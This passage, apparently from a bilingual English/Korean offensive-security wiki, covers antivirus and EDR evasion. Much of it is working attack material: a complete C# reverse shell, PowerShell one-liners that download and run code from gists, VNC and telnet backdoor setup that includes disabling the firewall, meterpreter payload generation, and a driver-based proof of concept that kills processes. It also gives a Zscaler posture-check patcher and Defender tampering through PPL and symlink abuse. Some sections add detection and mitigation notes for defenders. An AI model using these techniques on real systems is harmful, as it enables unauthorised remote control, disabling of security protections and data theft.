- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하여 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성일 수 있는 애플리케이션의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식을 사용합니다. 즉, 드물게 다운로드되는 애플리케이션은 SmartScreen을 유발하여 경고를 표시하고 최종 사용자가 파일을 실행하지 못하도록 막습니다(파일은 여전히 More Info -> Run anyway를 클릭하면 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름을 가진 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 해당 파일과 함께 다운로드된 URL 정보를 자동으로 생성합니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS를 확인하는 모습.</p></figcaption></figure>

> [!TIP]
> 실행 파일이 **trusted** signing certificate로 서명되어 있으면 **SmartScreen이 작동하지 않는다**는 점을 유의하세요.

payload가 Mark of The Web을 얻지 못하게 하는 매우 효과적인 방법 중 하나는 payload를 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 적용될 **수 없기** 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 payload를 출력 컨테이너로 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **log events**. However, it can also be used by security products to monitor and detect malicious activities.

Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. This is done by patching the function in memory to return immediately, effectively disabling ETW logging for that process.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping is a technique that allows an attacker to **manipulate the access token or a security prouct like an EDR or AV**, allowing them to reduce it privileges so the process won't die but it won't have permissions to check for malicious activities.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry in just one system, so it's pretty much impossible to stay completely undetected in mature environments.

Every environment you go against will have their own strengths and weaknesses.

I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 만들고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin 다운로드를 사용하세요, setup이 아닌)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 은밀함을 유지하려면 몇 가지를 하지 않아야 합니다

- `winvnc`가 이미 실행 중이면 시작하지 마십시오. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 뜹니다. 실행 중인지 확인하려면 `tasklist | findstr winvnc`를 사용하세요.
- 동일한 디렉터리에 `UltraVNC.ini`가 없으면 `winvnc`를 시작하지 마십시오. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다.
- 도움말을 보려 `winvnc -h`를 실행하지 마십시오. 그러면 [popup](https://i.imgur.com/oc18wcu.png)이 뜹니다.

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister를 시작**하고 **xml payload**를 **실행**하려면:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 자체 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 인젝터 빌드 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 더 보기

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 무력화

Storm-2603은 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 이용해 랜섬웨어를 투하하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **own vulnerable but *signed* driver**를 함께 배포하고, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 요점
1. **Signed driver**: 디스크에 배달된 파일은 `ServiceMouse.sys`지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버인 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 영역에서 접근 가능하게 만듭니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 임의의 프로세스를 PID로 종료 (Defender/EDR 서비스 종료에 사용) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버를 언로드하고 서비스를 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 user-mode protections를 완전히 우회합니다; 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 커널 객체를 변조할 수 있으며 PPL/PP, ELAM 또는 다른 하드닝 기능과 관계없이 동작합니다.

Detection / Mitigation
• Microsoft의 vulnerable-driver 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`의 로드를 거부하도록 합니다.  
• 새로운 *커널* 서비스 생성 모니터링을 수행하고, 드라이버가 world-writable 디렉터리에서 로드되었거나 allow-list에 없는 경우 경보를 발생시킵니다.  
• 사용자 모드 핸들이 커스텀 디바이스 객체에 생성된 뒤 의심스러운 `DeviceIoControl` 호출이 발생하는지 주시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소로 전달하기 위해 Windows RPC에 의존합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가가 **전적으로 client-side**에서 이루어짐 (서버에는 boolean만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **signed by Zscaler**인지(`WinVerifyTrust`를 통해)만 검증함.

디스크의 서명된 바이너리 4개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 체크가 적합한 것으로 처리됨 |
| `ZSAService.exe` | WinVerifyTrust에 대한 간접 호출 | NOP-ed ⇒ 어떤 프로세스(심지어 unsigned)도 RPC 파이프에 바인드 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 교체됨 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단락 처리됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks가 **green/compliant** 로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 named-pipe RPC endpoints를 열 수 있습니다 (예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 침해된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 대한 무제한 접근 권한을 얻습니다.

이 사례 연구는 순수하게 클라이언트 측 신뢰 결정과 단순 서명 검사가 몇 바이트의 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용해 LOLBINs로 AV/EDR을 변조하기

Protected Process Light (PPL)은 signer/level 계층을 강제하여 동급 또는 상위 권한의 protected process만 서로를 변조할 수 있도록 합니다. 공격적으로, 정당하게 PPL이 활성화된 바이너리를 실행하고 그 인수를 제어할 수 있다면, 정상적인 기능(예: 로깅)을 AV/EDR에서 사용하는 보호된 디렉터리에 대해 제약된, PPL 기반의 쓰기 프리미티브로 전환할 수 있습니다.

프로세스가 PPL로 실행되는 조건
- 대상 EXE (및 로드된 DLLs)는 PPL-capable EKU로 서명되어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 다음 플래그를 사용해야 합니다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 바이너리의 서명자와 일치하는 호환 가능한 보호 레벨이 요청되어야 합니다 (예: 안티멀웨어 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패합니다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

런처 도구
- 오픈 소스 헬퍼: CreateProcessAsPPL (보호 레벨을 선택하고 인수를 대상 EXE로 전달)
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 예시:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 프리미티브: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 단축 경로 헬퍼
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인(개요)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 위치 외에는 제어할 수 없다; 이 원시 기능은 정확한 내용 주입보다는 손상(corruption)에 적합하다.
- 서비스를 설치/시작하려면 로컬 관리자/SYSTEM 권한과 재부팅 시간이 필요하다.
- 타이밍이 중요: 대상이 열려 있어서는 안 된다; 부팅 시 실행하면 파일 잠금을 피할 수 있다.

Detections
- `ClipUp.exe`가 비정상적 인수로 생성되는 프로세스, 특히 비표준 런처에 의해 부모화(parented)되어 부팅 시점에 나타나는 경우.
- 자동 시작으로 구성된 새 서비스가 의심스러운 바이너리를 가리키며 일관되게 Defender/AV보다 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 사항을 조사하라.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그가 설정된 프로세스에 의한 예상치 못한 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 비-AV 바이너리에 의한 비정상적인 PPL 레벨 사용을 탐지하라.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있으며 어떤 부모 프로세스 아래에서 허용되는지를 제한하라; 합법적 컨텍스트 외에서의 ClipUp 호출을 차단하라.
- 서비스 위생: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링하라.
- Defender tamper protection과 early-launch 보호가 활성화되어 있는지 확인하라; 바이너리 손상을 나타내는 시작 오류를 조사하라.
- 환경과 호환된다면 보안 도구가 위치한 볼륨에서 8.3 short-name 생성 비활성화를 고려하라(철저히 테스트할 것).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender 변조 (Platform Version Folder Symlink Hijack)

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전식(lexicographic) 버전 문자열을 가진 하위 폴더(예: `4.18.25070.5-0`)를 선택한 다음, 해당 위치에서 Defender 서비스 프로세스를 시작한다(서비스/레지스트리 경로를 업데이트함). 이 선택은 디렉터리 항목(디렉터리 재분석 지점(reparse points), symlink 포함)을 신뢰한다. 관리자는 이를 이용해 Defender를 공격자가 쓰기 가능한 경로로 리다이렉트하여 DLL sideloading 또는 서비스 중단을 유발할 수 있다.

Preconditions
- 로컬 관리자(Platform 폴더 아래에 디렉터리/심볼릭 링크를 생성하는 데 필요)
- 재부팅하거나 Defender 플랫폼 재선택을 트리거할 수 있는 능력(부팅 시 서비스 재시작)
- 내장 도구만 필요(mklink)

Why it works
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택 과정에서 디렉터리 항목을 신뢰하고 대상이 보호되거나 신뢰된 경로로 해석되는지를 검증하지 않고 사전식으로 가장 높은 버전을 선택한다.

Step-by-step (example)
1) 현재 Platform 폴더의 쓰기 가능한 복제본을 준비한다(예: `C:\TMP\AV`):
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 상위 버전 directory symlink를 만들어 당신의 폴더를 가리키게 한다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 생성되고 해당 위치를 반영한 서비스 구성/레지스트리가 확인되어야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 삭제/교체하여 Defender 프로세스에서 코드를 실행합니다. 위 섹션 참조: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink를 제거하여 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작하지 못하게 합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
